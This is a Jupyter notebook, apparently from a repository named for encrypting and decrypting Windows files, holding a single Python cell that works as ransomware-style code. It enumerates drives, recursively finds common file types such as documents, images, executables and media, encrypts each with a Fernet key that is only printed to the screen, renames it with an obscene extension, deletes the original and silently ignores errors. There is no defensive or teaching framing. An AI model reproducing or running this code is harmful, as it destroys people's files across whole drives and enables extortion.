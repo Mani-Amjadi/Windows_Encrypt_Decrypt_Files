{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "source": [
    "#### Modules Used In Project ####\r\n",
    "from subprocess import *\r\n",
    "from cryptography.fernet import Fernet\r\n",
    "import os \r\n",
    "#### Generating Key ####\r\n",
    "key = Fernet.generate_key()\r\n",
    "encriptt = Fernet(key)\r\n",
    "keyCode = str(key).replace(\"b\",\"\",1).replace(\"'\",\"\",2)\r\n",
    "#### Showing Key ####\r\n",
    "print (f\"This is your key {keyCode}\")\r\n",
    "#### Finding System Drives ####\r\n",
    "Drives = getoutput(\"fsutil fsInfo drives\").replace(\"Drives:\",\"\").replace(\"\\\\\",\"\").split()\r\n",
    "### Removing C Drive ####\r\n",
    "if \"C:\" in Drives:\r\n",
    "    Drives.remove(\"C:\")\r\n",
    "Drives = [\"E:\",\"K:\"]\r\n",
    "#### fileFormats ####\r\n",
    "fileFormats = [\"psd\",\"py\",\"txt\",\"mp4\",\"exe\",\"jpg\",\"pdf\",\"mp3\"]\r\n",
    "######################################################\r\n",
    "#################### Encrypting Files ################\r\n",
    "def Encrypt(drive):\r\n",
    "    for Formatt in fileFormats:\r\n",
    "        try:\r\n",
    "            with open(\"log.txt\" , \"w\") as errorlog: \r\n",
    "                cmd = check_output(drive+\" && dir /S /B *.\"+Formatt , shell=True , stderr=errorlog).decode().replace(\"\\r\",\"\").split(\"\\n\")\r\n",
    "                for file in cmd:\r\n",
    "                    with open(file,\"rb\") as readfile:\r\n",
    "                        data = readfile.read()\r\n",
    "                        encData = encriptt.encrypt(data) #mani.FuckYou_txt\r\n",
    "                        newFile = open(file.replace(\".\"+Formatt,\"\")+\".FuckYou\"+\"_\"+Formatt,\"wb\")\r\n",
    "                        newFile.write(encData)\r\n",
    "                        readfile.close()\r\n",
    "                        newFile.close()\r\n",
    "                        os.remove(file)\r\n",
    "                        print (f\"{file} | Encrypted .\")\r\n",
    "        except:\r\n",
    "            pass\r\n",
    "\r\n",
    "if __name__ == \"__main__\":\r\n",
    "    for drive in Drives:\r\n",
    "        Encrypt(drive)"
   ],
   "outputs": [],
   "metadata": {}
  }
 ],
 "metadata": {
  "orig_nbformat": 4,
  "language_info": {
   "name": "python",
   "version": "3.9.0",
   "mimetype": "text/x-python",
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "pygments_lexer": "ipython3",
   "nbconvert_exporter": "python",
   "file_extension": ".py"
  },
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3.9.0 64-bit"
  },
  "interpreter": {
   "hash": "f9a665eed82786d1db64405b5cfd0f8037f4571b806793cb1072a84e044fc7ff"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}